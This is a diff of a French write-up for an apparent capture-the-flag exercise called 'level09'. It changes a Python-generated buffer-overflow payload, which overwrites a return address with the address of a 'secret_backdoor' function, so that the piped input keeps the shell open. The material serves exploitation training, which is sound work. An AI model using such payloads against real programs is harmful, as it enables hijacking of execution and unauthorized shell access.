@@ -85,5 +85,5 @@ L'adresse de cette fonction est `0x000055555555488c`.
 - '\x8c\x48\x55\x55\x55\x55\x00\x00' L'adresse de `secret_backdoor`.
 
 ```sh
-python -c "print('A' * 40 + '\xD0\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')" | ./level09
+(python -c "print('A' * 40 + '\xD0\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')"; cat) | ./level09
 ```
